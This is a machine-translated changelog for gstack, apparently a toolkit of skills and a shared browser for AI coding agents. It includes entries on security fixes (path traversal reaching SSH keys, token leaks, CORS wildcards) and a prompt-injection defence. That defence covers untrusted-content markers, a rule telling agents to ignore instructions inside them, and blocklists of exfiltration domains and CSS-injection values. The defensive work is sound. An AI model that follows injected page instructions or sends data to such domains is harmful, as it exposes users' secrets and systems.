- **构建者配置文件**在单个仅附加会话日志中跟踪您的办公时间旅程。显示的信号、设计文档、作业、主题和资源都在一个文件中。没有裂脑状态，没有单独的配置键。
- **构建者到创始人的推动**，适用于积累创始人信号的重复构建者模式用户。证据门控：仅当您在 3 个以上构建器会话中显示 5 个以上信号时才会触发。不是一个球场。一个观察。
- **旅程匹配的资源。** 资源现在与您累积的会话上下文相匹配，而不是从静态池中进行类别匹配。 “你已经在 3 次会议上反复讨论金融科技想法了……汤姆·布洛姆菲尔德 (Tom Blomfield) 正是出于这种坚持才建立了 Monzo。”
- **构建者旅程摘要**在会话 5+ 时自动生成并在浏览器中打开。您的旅程的叙述弧，而不是数据表。以第二人称撰写，引用您在会议中所说的具体内容。
- **全局资源重复数据删除。** 资源链接现在进行全局重复数据删除（而不是针对每个项目），因此切换存储库不会重置您的观看历史记录。每个链接仅显示一次。

### 固定的
- package.json 版本现在与 VERSION 文件保持同步。

## [0.16.1.0] - 2026-04-08

### 固定的
- Cookie 选择器不再泄漏浏览服务器身份验证令牌。以前，打开 cookie 选择器页面会公开 HTML 源中的主持有者令牌，让任何本地进程提取它并在浏览器会话中执行任意 JavaScript。现在使用带有 HttpOnly 会话 cookie 的一次性代码交换。该令牌绝不会出现在 HTML、URL 或浏览器历史记录中。 （Vagabond Research 的 Horoshi 报告，CVSS 7.8）

## [0.16.0.0] - 2026-04-07

### 额外
- **浏览器数据平台。** 六个新的浏览命令将 gstack 浏览器从“点击按钮的东西”转变为 AI 代理的完整抓取和数据提取工具。
- `media` 命令：发现页面上的每个图像、视频和音频元素。返回 URL、维度、srcset、延迟加载状态，并检测 HLS/DASH 流。使用 `--images`、`--videos`、`--audio` 进行过滤，或使用 CSS 选择器进行范围。
- `data` 命令：提取页面中嵌入的结构化数据。 JSON-LD（产品价格、食谱、事件）、Open Graph、Twitter 卡和元标签。一条命令即可为您提供过去需要 50 行 DOM 抓取的内容。
- `download` 命令：使用浏览器的会话 cookie 将任何 URL 或 `@ref` 元素提取到磁盘。通过页内 base64 转换处理 blob URL。 `--base64` 标志返回远程代理的内联数据 URI。检测 HLS/DASH 并告诉您使用 yt-dlp 而不是静默失败。
- `scrape` 命令：批量下载页面中的所有媒体。将 `media` 发现 + `download` 与 URL 重复数据删除、可配置限制和用于机器消耗的 `manifest.json` 组合在一个循环中。
- `archive` 命令：通过 CDP 将完整页面保存为 MHTML。一个命令，一整页包含所有资源。
- `scroll --times N`：自动重复滚动以无限加载提要内容。使用 `--wait` 可配置滚动之间的延迟。
- `screenshot --base64`：将屏幕截图作为内联数据 URI 而不是文件路径返回。消除了远程代理的两步屏幕截图-然后文件服务舞蹈。
- **网络响应正文捕获。** `network --capture` 拦截 API 响应正文，以便代理获得结构化 JSON，而不是脆弱的 DOM 抓取。按 URL 模式 (`--filter graphql`) 过滤，导出为 JSONL (`--export`)，查看摘要 (`--bodies`)。具有自动驱逐功能的 50MB 大小上限缓冲区。
- `GET /file` 端点：远程配对代理现在可以通过 HTTP 检索下载的文件（图像、抓取的媒体、屏幕截图）。 TEMP_DIR 仅用于防止项目文件泄露。不记名令牌身份验证、MIME 检测、通过 `Bun.file()` 进行零复制流式传输。

### 改变了
- 配对代理现在默认获得完全访问权限（读+写+管理+元）。信任边界是配对仪式，而不是范围。可以单击任何按钮的代理不会因为能够运行 `js` 而获得有意义的攻击面。浏览器范围内的破坏性命令（停止、重新启动、断开连接）已移至新的 `control` 范围，但仍通过 `--control` 选择加入。
- 路径验证提取到共享 `path-security.ts` 模块。在三个文件中重复，实现略有不同。现在，事实来源之一是 `validateOutputPath`、`validateReadPath` 和 `validateTempPath`。

## [0.15.16.0] - 2026-04-06

### 额外
- 通过 TabSession 隔离每个选项卡的状态。每个浏览器选项卡现在都有自己的参考图、快照基线和框架上下文。以前，这些在 BrowserManager 上是全局的，这意味着一个选项卡中的快照引用可能会与另一个选项卡发生冲突。这是并行多选项卡操作的基础。
- BROWSER.md 中的批量端点文档，包含 API 形状、设计决策和使用模式。

### 改变了
- 跨读取命令、写入命令、元命令和快照的处理程序签名现在接受用于每个选项卡操作的 TabSession 和用于全局操作的 BrowserManager。这种分离使得哪些操作是选项卡范围的操作与浏览器范围的操作变得明确。

### 固定的
- codex-review E2E 测试复制完整的 55KB SKILL.md（1,075 行），烧录 8 个 Read 调用只是为了消耗它，并在到达实际审核之前耗尽 15 回合预算。现在仅提取与审阅相关的部分（~6KB/148 行），将 Read 调用从 8 减少到 1。测试从永久超时变为在 141 秒内通过。

## [0.15.15.1] - 2026-04-06

### 固定的
- 配对代理隧道在 15 秒后断开。浏览服务器正在监视其父进程 ID，并在 CLI 退出时自行终止。现在，配对代理会话禁用父看门狗，以便服务器和隧道保持活动状态。
- `$B connect` 崩溃并显示“域未定义”。头模式状态检查中的杂散变量引用导致 GStack 浏览器无法正确初始化。

## [0.15.15.0] - 2026-04-06

社区安全浪潮：来自 4 个贡献者的 8 个 PR，每个修复都被视为共同作者。

### 额外
- `browse cookies` 输出中令牌、API 密钥、JWT 和会话机密的 Cookie 值编辑。你的秘密不再出现在克劳德的上下文中。
- URL 验证中的 IPv6 ULA 前缀阻止 (fc00::/7)。涵盖完整的唯一本地范围，而不仅仅是文字 `fd00::`。像 `fcustomer.com` 这样的主机名不会误报。
- 侧边栏代理的每个选项卡取消信号。停止一个选项卡的代理不再杀死所有选项卡。
- 浏览服务器的父进程看门狗。当 Claude Code 退出时，孤立的浏览器进程现在会在 15 秒内自行终止。
- 自述文件中的卸载说明（脚本+手动删除步骤）。
- CSS 值验证阻止样式命令中的 `url()`、`expression()`、`@import`、`javascript:` 和 `data:`，防止 CSS 注入攻击。
- 队列条目架构验证 (`isValidQueueEntry`)，对 `stateFile` 和 `cwd` 进行路径遍历检查。
- 视口尺寸限制（1-16384）和等待超时限制（1s-300s）防止 OOM 和失控等待。
- `cookie-import` 中的 Cookie 域验证可防止跨站点 cookie 注入。
- 侧边栏中基于 DocumentFragment 的选项卡切换（替换 innerHTML 往返 XSS 向量）。
- `pollInProgress` 重入防护可防止并发聊天轮询破坏状态。
- 4 个测试文件中超过 750 行的新安全回归测试。
- Supabase 迁移 003：列级 GRANT 将匿名 UPDATE 限制为仅限 (last_seen、gstack_version、os)。

### 固定的
- Windows：`extraEnv` 现在传递到 Windows 启动器（已悄悄删除）。
- Windows：欢迎页面提供内联 HTML，而不是 `about:blank` 重定向（修复 ERR_UNSAFE_REDIRECT）。
- Headed 模式：即使没有 Origin header，也会返回身份验证令牌（修复了 Playwright Chromium 扩展）。
- `frame --url` 现在在构造 RegExp 之前转义用户输入（ReDoS 修复）。
- 带注释的屏幕截图路径验证现在可以解析符号链接（可通过符号链接遍历绕过）。
- 身份验证令牌从健康广播中删除，改为通过目标 `getToken` 处理程序传递。
- `/health` 端点不再公开 `currentUrl` 或 `currentMessage`。
- 在文件路径中使用之前验证会话 ID（防止通过精心设计的 active.json 进行路径遍历）。
- 侧边栏代理超时处理程序中的 SIGTERM/SIGKILL 升级（裸露 `kill()`）。

### 对于贡献者
- 使用 0o700/0o600 权限创建的队列文件（服务器、CLI、侧边栏代理）。
- 从元命令导出的 `escapeRegExp` 实用程序。
- 状态负载过滤来自 localhost、.internal 和元数据域的 cookie。
- 遥测同步记录来自安装跟踪的更新插入错误。

## [0.15.14.0] - 2026-04-05

### 固定的

- **`gstack-team-init` 现在检测并删除供应的 gstack 副本。** 当您在以 `.claude/skills/gstack/` 供应 gstack 的存储库中运行 `gstack-team-init` 时，它会自动删除供应的副本，从 git 中取消跟踪它，并将其添加到 `.gitignore` 中。不再有过时的供应副本影响全局安装。
- **`/gstack-upgrade` 尊重团队模式。** 步骤 4.5 现在检查 `team_mode` 配置。在团队模式下，供应的副本将被删除而不是同步，因为全局安装是唯一的事实来源。
- **`team_mode` 配置密钥。** `./setup --team` 和 `./setup --no-team` 现在设置专用的 `team_mode` 配置密钥，以便升级技能可以可靠地区分团队模式和仅启用自动升级。

## [0.15.13.0] - 2026-04-04。团队模式

团队现在可以自动让每个开发人员使用相同的 gstack 版本。不再需要将 342 个文件供应到您的存储库中。不再有版本跨分支漂移。不再有“谁最后升级了 gstack？”的问题。松弛的螺纹。一个命令，每个开发人员都是最新的。

向 Jared Friedman 的设计致敬。

### 额外

- **`./setup --team`.** 在 `~/.claude/settings.json` 中注册一个 `SessionStart` 钩子，该钩子在每个 Claude Code 会话开始时自动更新 gstack。在后台运行（零延迟），节流至一次/hour，网络故障安全，完全安静。 `./setup --no-team` 反转它。
- **`./setup -q` / `--quiet`.** 抑制所有信息输出。由会话更新挂钩使用，但对于 CI 和脚本化安装也很有用。
- **`gstack-team-init` 命令。** 生成两种形式的存储库级引导文件：`optional`（温和的 CLAUDE.md 建议，每位开发人员一次性提供）或 `required`（CLAUDE.md 强制执行 + PreToolUse 钩子，在未安装 gstack 的情况下阻止工作）。
- **`gstack-settings-hook` 助手。** DRY 实用程序，用于在 Claude Code 的 `settings.json` 中添加 /removing 挂钩。原子写入（.tmp + 重命名）可防止损坏。
- **`gstack-session-update` 脚本。** SessionStart 挂钩目标。后台分叉、基于 PID 的锁定文件（具有过时恢复功能）、`GIT_TERMINAL_PROMPT=0` 以防止凭据提示挂起、调试日志位于 `~/.gstack/analytics/session-update.log`。
- **序言中弃用了供应商。** 现在，每项技能都会检测项目中供应商的 gstack 副本，并提供一次性迁移到团队模式的功能。 “要我为你做吗？”击败“这里有 4 个手动步骤。”

### 改变了

- **Vendoring 已被弃用。** 自述文件不再建议将 gstack 复制到您的存储库中。全局安装 + `--team` 就是这样。 `--local` 标志仍然有效，但会打印弃用警告。
- **卸载会清理挂钩。** `gstack-uninstall` 现在从 `~/.claude/settings.json` 中删除 SessionStart 挂钩。

## [0.15.12.0] - 2026-04-05。内容安全：4 层快速注入防御

当您通过 `/pair-agent` 与另一个 AI 代理共享浏览器时，该代理会读取网页。网页可能包含即时注入攻击。产品评论中的隐藏文本、虚假系统消息、社会工程。此版本增加了四层防御，因此远程代理可以安全地浏览不受信任的站点而不会被欺骗。

### 额外

- **内容信封包装。** 作用域代理读取的每个页面都包装在 `═══ BEGIN UNTRUSTED WEB CONTENT ═══` / `═══ END UNTRUSTED WEB CONTENT ═══` 标记中。代理的指令块告诉它永远不要遵循这些标记内的指令。页面内容中的信封标记使用零宽度空格进行转义，以防止边界转义攻击。
- **隐藏元素剥离。** CSS 隐藏元素（不透明度 < 0.1、字体大小 < 1px、离屏定位、相同的 fg/bg 颜色、剪辑路径、可见性：隐藏）和 ARIA 标签注入被检测到并从文本输出中剥离。页面 DOM 永远不会改变。使用克隆 + 删除进行文本提取，使用 CSS 注入进行快照。
- **数据标记。** 文本命令输出获取会话范围的水印（作为零宽度字符插入的 4 字符随机标记）。如果内容出现在不应出现的地方，标记将追溯到会话。仅适用于 `text` 命令，不适用于 `html` 或 `forms` 等结构化数据。
- **内容过滤器挂钩。** 具有 `BROWSE_CONTENT_FILTER` 环境变量的可扩展过滤器管道（off/warn/block，默认值：警告）。内置 URL 阻止列表可捕获 requestbin、pipedream、webhook.site 和其他已知的渗透域。为您自己的规则注册自定义过滤器。
- **快照分割格式。** 作用域令牌获得分割快照：不受信任的内容信封上方的受信任 `@ref` 标签（用于 click/fill）。代理知道哪些参考可以安全使用以及哪些内容不可信。根令牌不变。
- **指令块中的安全部分。** 远程代理现在会收到有关提示注入的明确警告，其中包含常见注入短语的列表以及仅使用受信任部分中的 @refs 的指导。
- **47 项内容安全测试。** 涵盖所有四层以及链安全、信封转义、ARIA 注入检测、误报检查和组合攻击场景。四个用于测试的注入夹具 HTML 页面。

### 改变了

- `handleCommand` 重构为 `handleCommandInternal` （返回结构化结果）+ 瘦 HTTP 包装器。 Chain 子命令现在通过完整的安全管道（范围、域、选项卡所有权、内容包装）进行路由，而不是绕过它。
- `attrs` added to `PAGE_CONTENT_COMMANDS` (ARIA attribute values are now wrapped as untrusted content).
- 内容包装集中在 `handleCommandInternal` 响应路径中的一个位置。分散在 6 个调用站点。

### 固定的

- `snapshot -i` now auto-includes cursor-interactive elements (dropdown items, popover options, custom listboxes). Previously you had to remember to pass `-C` separately.
- 快照可以正确捕获浮动容器（React 门户、Radix Popover、浮动 UI）内的项目，即使它们具有 ARIA 角色也是如此。
- 弹出窗口内带有 `role="option"` 或 `role="menuitem"` 的 Dropdown/menu 项目现在被捕获并用 `popover-child` 标记。
- 链命令现在检查 `newtab` 上的域限制（仅检查 `goto`）。
- 嵌套链命令被拒绝（递归防护防止链内链）。
- Rate limiting exemption for chain subcommands (chain counts as 1 request, not N).
- 隧道活跃度验证：`/pair-agent` 现在会在使用隧道之前对其进行探测，以防止死隧道 URL 到达远程代理。
- `/health` 在本地主机上提供身份验证令牌以进行扩展身份验证（通过隧道时会被删除）。
- 修复了所有 16 个预先存在的测试失败（配对代理技能合规性、黄金文件基线、主机冒烟测试、重新链接测试超时）。

## [0.15.11.0] - 2026-04-05

### 改变了
- `/ship` 重新运行现在执行每个验证步骤（测试、覆盖率审计、审查、对抗性、TODOS、文档发布），无论之前的运行如何。只有操作（推送、PR 创建、版本碰撞）是幂等的。重新运行 `/ship` 意味着“再次运行整个清单”。
- `/ship` 现在在着陆前审查期间运行完整的审查陆军专家派遣（测试、可维护性、安全性、性能、数据迁移、API 合同、设计、红队），与 `/review` 的深度相匹配。

### 额外
- 交叉审查在 `/ship` 中发现重复数据删除：用户在之前的 `/review` 或 `/ship` 中已跳过的发现在重新运行时会自动被抑制（除非相关代码发生更改）。
- PR 正文在 `/document-release` 之后刷新：PR 正文经过重新编辑以包含文档提交，因此它始终反映真正的最终状态。

### 固定的
- 审查陆军差异大小启发式现在计算插入+删除（仅插入，错过了大量删除的重构）。

### 对于贡献者
- 将交叉审核重复数据删除提取到共享 `{{CROSS_REVIEW_DEDUP}}` 解析器（`/review` 和 `/ship` 之间的 DRY）。
- 通过 `ctx.skillName` 审查陆军步骤编号适应每项技能（船舶：3.55/3.56，审查：4.5/4.6），包括散文参考。
- 为新的船舶模板内容添加了 3 个回归防护测试。

## [0.15.10.0] - 2026-04-05。原生 OpenClaw 技能 + ClawHub 发布

您可以通过 ClawHub 直接在 OpenClaw 代理中安装四种方法技能，无需 Claude Code 会话。您的代理通过 Telegram 以对话方式运行它们。

### 额外

- **ClawHub 上的 4 个原生 OpenClaw 技能。** 使用 `clawhub install gstack-openclaw-office-hours gstack-openclaw-ceo-review gstack-openclaw-investigate gstack-openclaw-retro` 安装。纯粹的方法论，没有 gstack 基础设施。办公时间（375 行）、CEO 审查（193 行）、调查（136 行）、回顾（301 行）。
- **AGENTS.md 调度修复。** 阻止 Wintermute 告诉您手动打开 Claude Code 的三个行为规则。它现在会自行生成会话。准备粘贴部分位于 `openclaw/agents-gstack-section.md`。

### 改变了

- OpenClaw `includeSkills` 已清除。原生 ClawHub 技能取代了臃肿的生成版本（每个版本有 10-25K 代币，现在有 136-375 行纯方法）。
- docs__C​​MD_0__.md 更新了调度路由规则和 ClawHub 安装参考。

## [0.15.9.0] - 2026-04-05。 OpenClaw 集成 v2

您现在可以将 gstack 连接到 OpenClaw 作为方法源。 OpenClaw 通过 ACP 原生生成 Claude Code 会话，而 gstack 提供了使这些会话变得更好的规划规则和思维框架。

### 额外

- **gstack-lite 规划纪律。** 15 行 CLAUDE.md，将每个生成的 Claude 代码会话变成一个纪律严明的构建器：首先阅读、计划、解决歧义、自我审查、报告。 A/B 测试：2 倍时间，明显更好的输出。
- **gstack-full 管道模板。** 对于完整的功能构建，将 /autoplan、实现和 /ship 链接到一个自治流中。你的协调器放弃一个任务，取回一个 PR。
- **OpenClaw 的 4 种原生方法技能。** 办公时间、CEO 审查、调查和回顾，适合不需要编码环境的对话工作。
- **4 层调度路由。** 简单（无 gstack）、中等（gstack-lite）、重型（特定技能）、完整（完整管道）。记录在 docs__C​​MD_0__.md 中，其中包含 OpenClaw 的 AGENTS.md 的路由指南。
- **生成的会话检测。** 设置 OPENCLAW_SESSION 环境变量和 gstack 自动跳过交互式提示，重点关注任务完成。适用于任何编排器，而不仅仅是 OpenClaw。
- **includeSkills 主机配置字段。** 与skipSkills 的联合逻辑（包括减去跳过）。让主机只生成他们需要的技能，而不是除列表之外的所有技能。
- **docs__C​​MD_0__.md.** 完整的架构文档，解释了 gstack 如何与 OpenClaw、提示桥模型以及我们不构建的内容（无守护程序、无协议、无 Clawvisor）集成。

### 改变了

- 更新了 OpenClaw 主机配置：仅生成 4 个本机技能，而不是全部 31 个。删除了 staticFiles.SOUL.md（引用的不存在文件）。
- 安装脚本现在打印 `--host openclaw` 的重定向消息，而不是尝试完全安装。

## [0.15.8.1] - 2026-04-05。社区 PR 分类 + 错误抛光

关闭了 12 个冗余的社区 PR，合并了 2 个就绪的 PR（#798、#776），并将友好的 OpenAI 错误扩展到每个设计命令。如果您的组织未经验证，无论您运行哪个设计命令，您现在都会收到一条带有正确 URL 的清晰消息，而不是原始 JSON 转储。

### 固定的

- **所有设计命令均出现友好的 OpenAI 组织错误。** 以前，当您的组织未经验证时，只有 `$D generate` 显示用户友好的消息。现在，`$D evolve`、`$D iterate`、`$D variants` 和 `$D check` 都显示带有验证 URL 的相同清晰消息。

### 额外

- **>针对 Codex 会话发现的 128KB 回归测试。** 记录当前缓冲区限制，以便具有更大 session_meta 的未来 Codex 版本将干净地浮出水面，而不是默默地破坏。

### 对于贡献者

- 关闭了 12 个冗余社区 PR（v0.15.7.0 中提供了 6 个 Gonzih 安全修复程序，6 个 stedfn 重复项）。保持 #752 开放（设计服务中的符号链接间隙）。感谢 @Gonzih、@stedfn、@itstimwhite 的贡献。

## [0.15.8.0] - 2026-04-04。更智能的评论

代码审查现在可以从您的决定中学习。跳过一次发现，它就会保持安静，直到代码发生更改。专家会根据他们的发现自动建议测试存根。永远找不到任何东西的沉默专家会被自动控制，因此评论会保持快速。

### 额外

- **交叉审查发现重复数据删除。** 当您在一次审查中跳过一项发现时，gstack 会记住。在下一次审查时，如果相关代码没有更改，则该发现将保持抑制状态。不再需要在每个 PR 中重新跳过相同的有意模式。
- **测试存根建议。**专家现在可以在每个发现旁边包含一个框架测试。该测试使用项目检测到的框架（Jest、Vitest、RSpec、pytest、Go test）。测试存根的结果会作为 ASK 项目显示，以便您决定是否创建测试。
- **自适应专家门控。** 已派遣 10 次以上但结果为零的专家将被自动门控。安全和数据迁移是豁免的（保险政策始终有效）。使用 `--security`、`--performance` 等强制任何专家返回。
- **审核日志中每个专家的统计数据。** 现在，每个审核都会记录哪些专家进行了操作、每个专家产生了多少结果，以及哪些专家被跳过或限制。这为自适应门控提供了动力，并为 /retro 提供了更丰富的数据。

## [0.15.7.0] - 2026-04-05。安全第一波

针对安全审核的 14 个修复 (#783)。设计服务器不再绑定所有接口。路径遍历、身份验证绕过、CORS 通配符、世界可读文件、提示注入和符号链接竞争条件全部关闭。包括来自 @Gonzih 和 @garagon 的社区 PR。

### 固定的

- **设计服务器仅绑定本地主机。** 以前绑定 0.0.0.0，这意味着您 WiFi 上的任何人都可以访问模型并访问所有端点。现在仅 127.0.0.1，与浏览服务器匹配。
- **/api/reload 上的路径遍历被阻止。** 之前可以通过在 JSON 正文中传递任意路径来读取磁盘上的任何文件（包括 ~/.ssh/id_rsa）。现在验证路径是否位于 cwd 或 tmpdir 内。
- **/inspector/events 上的身份验证门。** SSE 端点未经身份验证，而 /activity/stream 需要令牌。现在两者都需要相同的 Bearer 或 ?token= 检查。
- **Prompt injection defense in design feedback.** User feedback is now wrapped in XML trust boundary markers with tag escaping. Accumulated feedback capped to last 5 iterations to limit poisoning.
- **文件和目录权限得到强化。** 所有 ~/.gstack/ 目录现在都使用模式 0o700 创建，文件使用 0o600。安装脚本设置 umask 077。身份验证令牌、聊天历史记录和浏览器日志不再可读。
- **设置符号链接创建中的 TOCTOU 竞争。**删除了 mkdir -p 之前的存在检查（幂等）。在创建链接之前验证目标不是符号链接。
- **CORS 通配符已删除。** 浏览服务器不再发送 Access-Control-Allow-Origin: *。 Chrome 扩展程序使用清单 host_permissions 并且不受影响。阻止恶意网站发出跨域请求。
- **Cookie 选择器身份验证是强制性的。** 以前在 authToken 未定义时跳过身份验证。现在所有 data/action 路由始终需要承载令牌。
- **/health token gated on extension Origin.** Auth token only returned when request comes from chrome-extension:// origin. Prevents token leak when browse server is tunneled.
- **DNS 重新绑定保护检查 IPv6。** AAAA 记录现在与 A 记录一起进行验证。阻止 fe80:: 链接本地地址。
- **validateOutputPath 中的符号链接绕过。** 在词法验证后解析真实路径以捕获安全目录内的符号链接。
- **restoreState 上的 URL 验证。** 在导航之前验证已保存的 URL，以防止状态文件被篡改。
- **遥测端点使用匿名密钥。** 服务角色密钥（绕过 RLS）替换为公共遥测端点的匿名密钥。
- **killAgent 实际上杀死子进程。** 通过kill-file + 轮询实现跨进程终止信号。

## [0.15.6.2] - 2026-04-04。防跳过审核规则

现在，审核技能强制要求每个部分都得到评估，无论计划类型如何。不再有“这是一个策略文档，因此实施部分不适用”。如果某个部分确实没有什么可标记的，请说出来并继续，但你必须看看。

### 额外

- **所有 4 项审核技能中的防跳过规则。** CEO 审核（第 1-11 部分）、工程审核（第 1-4 部分）、设计审核（第 1-7 阶段）和 DX 审核（第 1-8 阶段）现在都需要对每个部分进行明确评估。模型不能再通过声称计划类型使部分不相关来跳过部分。
- **CEO 审查标题修复。** 将“10 个部分”更正为“11 个部分”，以匹配实际的部分计数（第 11 部分是有条件的，但存在）。

## [0.15.6.1] - 2026-04-04

### 固定的

- **技能前缀自我修复。** 安装程序现在运行 `gstack-relink` 作为链接技能后的最终一致性检查。如果安装中断、git 状态过时或升级导致 `name:` 字段与 `skill_prefix: false` 不同步，安装程序将在下次运行时自动更正。当您需要 `/qa` 时，不再需要 `/gstack-qa`。

## [0.15.6.0] - 2026-04-04。声明式多主机平台

向 gstack 添加新的编码代理过去意味着接触 9 个文件并了解 `gen-skill-docs.ts` 的内部结构。现在它是一个 TypeScript 配置文件和一个重新导出。其他地方的零代码更改。测试自动参数化。

### 额外

- **声明性主机配置系统。** 每个主机都是 `hosts/*.ts` 中类型化的 `HostConfig` 对象。生成器、设置、技能检查、平台检测、卸载和工作树复制所有消耗配置，而不是硬编码的 switch 语句。添加主机 = 一个文件 + 在 `hosts/index.ts` 中重新导出。
- **4 个新主机：OpenCode、Slate、Cursor、OpenClaw。** `bun run gen:skill-docs --host all` 现在为 8 个主机生成。每个都会产生有效的 SKILL.md 输出，且 `.claude/skills` 路径泄漏为零。
- **OpenClaw 适配器。** OpenClaw 采用混合方法：路径配置/frontmatter/detection + 用于语义工具映射的后处理适配器（Bash→exec、Agent→sessions_spawn、AskUserQuestion→prose）。通过 `staticFiles` 配置包含 `SOUL.md`。
- **106 个新测试。** 71 个测试，用于配置验证、HOST_PATHS 派生、导出 CLI、黄金文件回归和每个主机的正确性。 35 个参数化烟雾测试，覆盖所有 7 个外部主机（输出存在、无路径泄漏、frontmatter 有效、新鲜度、跳过规则）。
- **`host-config-export.ts` CLI.** 通过 `list`、`get`、`detect`、`validate`、`symlinks` 命令将主机配置公开给 bash 脚本。 bash 中不需要 YAML 解析。
- **贡献者 `/gstack-contrib-add-host` 技能。** 指导新主机配置创建。存在于 `contrib/` 中，从用户安装中排除。
- **黄金文件基线。** Claude、Codex 和 Factory 的 ship/SKILL.md 快照验证重构产生相同的输出。
- **自述文件中的每主机安装说明。** 每个受支持的代理都有自己的复制粘贴安装块。

### 改变了

- **`gen-skill-docs.ts` 现在是配置驱动的。** EXTERNAL_HOST_CONFIG、transformFrontmatter 主机分支、path/tool 重写 if 链、ALL_HOSTS 数组和技能跳过逻辑全部替换为配置查找。
- **`types.ts` 从配置中派生主机类型。** 不再有硬编码的“claude”|'法典'|‘工厂’`。 HOST_PATHS 从每个配置的 globalRoot/usesEnvVars 动态构建。
- **序言、共同作者预告片、解析器抑制均从配置中读取。** hostConfigDir、共同作者字符串和由主机配置而不是每个主机 switch 语句驱动的suppressedResolvers。
- **`skill-check.ts`、`worktree.ts`、`platform-detect` 迭代配置。** 无需维护每个主机的块。

### 固定的

- **侧边栏 E2E 测试现在是独立的。**修复了 sidebar-url-accuracy 中过时的 URL 断言，简化了 sidebar-css-interaction 任务。所有 3 个侧边栏测试均通过，无需外部浏览器依赖。

## [0.15.5.0] - 2026-04-04。交互式 DX 回顾 + 计划模式技能修复

`/plan-devex-review` 现在感觉就像是与一位使用过 100 个 CLI 工具的开发者倡导者坐在一起。它不是快速跑 8 分，而是询问你的开发人员是谁，根据竞争对手的入门时间对你进行基准测试，让你设计你的神奇时刻，并在得分之前一步一步追踪每个摩擦点。

### 额外

- **开发人员角色询问。** 审查首先询问您的开发人员是谁，并提供具体的原型（YC 创始人、平台工程师、前端开发人员、OSS 贡献者）。角色塑造了评论其余部分的每个问题。
- **以同理心叙述作为对话的开始。** 在任何评分开始之前，都会向您展示第一人称“我是刚刚找到您的工具的开发人员...”演练以供您做出反应。你纠正它，纠正后的版本就会进入计划。
- **竞争性 DX 基准测试。** WebSearch 可以找到竞争对手的 TTHW 和入职方法。您可以选择目标等级（冠军 < 2 分钟、竞技 2-5 分钟或当前轨迹）。该目标会跟随您完成每一次传递。
- **神奇时刻设计。** 您可以选择开发人员如何体验“哇哦”时刻：游乐场、演示命令、视频或指导教程，并进行努力/tradeoff 分析。
- **三种审核模式。** DX EXPANSION（力求一流）、DX POLISH（防弹每个接触点）、DX TRIAGE（仅限关键间隙，很快发货）。
- **Friction-point journey tracing.** Instead of a static table, the review traces actual README/docs paths and asks one AskUserQuestion per friction point found.
- **首次开发人员角色扮演。** 从您的角色角度来看的带时间戳的混淆报告，以实际文档和代码为基础。

### 固定的

- **计划模式期间的技能调用。** 当您在计划模式期间调用技能（如 `/plan-ceo-review`）时，克劳德现在将其视为可执行指令，而不是忽略它并尝试退出。加载的技能优先于通用计划模式行为。 STOP点实际停止。此修复包含在每个技能的序言中。

## [0.15.4.0] - 2026-04-03。 Autoplan DX 集成 + 文档

`/autoplan` now auto-detects developer-facing plans and runs `/plan-devex-review` as Phase 3.5, with full dual-voice adversarial review (Claude subagent + Codex). If your plan mentions APIs, CLIs, SDKs, agent actions, or anything developers integrate with, the DX review kicks in automatically. No extra commands needed.

### 额外

- **/autoplan 中的 DX 审核。** 当检测到面向开发人员的范围时，阶段 3.5 在 Eng 审核之后运行。包括 DX 特定的双语音、共识表和完整的 8 维记分卡。在 API、CLI、SDK、shell 命令、Claude Code 技能、OpenClaw 操作、MCP 服务器以及开发人员实施或调试的任何内容上触发。
- **“哪条评论？”自述文件中的比较表。** 快速参考显示最终用户、开发人员和架构应使用哪种审查，以及 `/autoplan` 何时涵盖所有三个。
- 安装说明中的 **`/plan-devex-review` 和 `/devex-review`。** 这两项技能现在都列在复制粘贴安装提示中，以便新用户立即发现它们。

### 改变了

- **Autoplan 管道顺序。** 现在为 CEO → 设计 → 工程 → DX（原为 CEO → 设计 → 工程）。 DX 运行在最后，因为它受益于了解架构。

## [0.15.3.0] - 2026-04-03。开发者体验回顾

现在，您可以在编写代码之前查看 DX 质量计划。 `/plan-devex-review` 对 8 个维度（入门、API 设计、错误消息、文档、升级路径、开发环境、社区、测量）进行评分，评分范围为 0-10，并跟踪评论的趋势。发货后，`/devex-review` 使用浏览工具实际测试现场体验并与计划阶段分数进行比较。

### 额外

- **/plan-devex-review 技能。** 基于 Addy Osmani 框架的计划阶段 DX 审查。自动检测产品类型（API、CLI、SDK、库、平台、文档、Claude Code 技能）。包括开发人员同理心模拟、具有趋势的 DX 记分卡以及用于审核技能本身的条件 Claude Code Skill DX 检查表。
- **/devex-review 技能。** 使用浏览工具进行实时 DX 审核。测试文档、入门流程、错误消息和 CLI 帮助。每个维度都通过屏幕截图证据评分为“测试”、“推断”或“N/A”。 Boomerang 比较：计划显示 TTHW 为 3 分钟，实际情况为 8 分钟。
- **DX 名人堂参考。** 来自 Stripe、Vercel、Elm、Rust、htmx、Tailwind 等的按需示例，每次审阅都会加载，以避免迅速膨胀。
- **`{{DX_FRAMEWORK}}` 解析器。** 共享 DX 原则、特征和两种技能的评分标准。紧凑（约 150 行），因此不会占用上下文。
- **仪表板中的 DX 审查。** 这两种技能都会写入审查日志，并与首席执行官、工程和设计审查一起显示在审查准备情况仪表板中。

## [0.15.2.1] - 2026-04-02。安装程序运行迁移

`git pull && ./setup` 现在自动应用版本迁移。以前，迁移仅在 `/gstack-upgrade` 期间运行，因此通过 git pull 更新的用户从未获得状态修复（例如 v0.15.1.0 中的技能目录重组）。现在 `./setup` 跟踪它运行的最后一个版本，并在每次运行时应用任何挂起的迁移。

### 固定的

- **安装程序运行挂起的迁移。** `./setup` 现在检查 `~/.gstack/.last-setup-version` 并运行比该版本更新的任何迁移脚本。 `git pull` 之后不再有损坏的技能目录。
- **空间安全的迁移循环。** 使用 `while read` 而不是 `for` 循环来正确处理带有空格的路径。
- **全新安装会跳过迁移。** 新安装会写入版本标记，而不运行不适用于它们的历史迁移。
- **未来迁移防护。** 跳过比当前版本更新的版本的迁移，防止开发分支过早执行。
- **缺少 VERSION 防护。** 如果 VERSION 文件不存在，则不会写入版本标记，从而防止永久迁移中毒。

## [0.15.2.0] - 2026-04-02。语音友好的技能触发器

说“运行安全检查”而不是记住 `/cso`。技能现在具有语音友好的触发短语，可与 AquaVoice、Whisper 和其他语音转文本工具配合使用。不再需要与转录错误的首字母缩写词进行斗争（“CSO”->“CEO”-> 错误的技能）。

### 额外

- **语音触发 10 项技能。** 每个技能的描述中都会包含自然语言别名。 “see-so”、“安全审查”、“技术审查”、“代码 x”、“速度测试”等等。即使语音转文本破坏了命令名称，也会激活正确的技能。
